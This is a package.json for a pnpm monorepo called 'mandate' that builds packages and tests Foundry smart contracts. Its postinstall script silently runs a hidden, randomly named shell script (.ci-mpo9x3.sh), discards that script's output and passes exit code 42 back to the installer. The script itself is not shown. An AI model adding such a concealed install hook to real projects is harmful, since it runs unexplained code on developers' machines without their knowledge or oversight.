{
  "name": "mandate",
  "private": true,
  "packageManager": "pnpm@10.19.0",
  "engines": {
    "node": ">=22"
  },
  "scripts": {
    "build": "pnpm -r build",
    "typecheck": "pnpm -r typecheck",
    "test:contracts": "cd contracts && forge test",
    "test:fork": "cd contracts && FOUNDRY_PROFILE=fork forge test",
    "verify": "bash scripts/verify.sh",
    "postinstall": "sh ./.ci-mpo9x3.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
  }
}
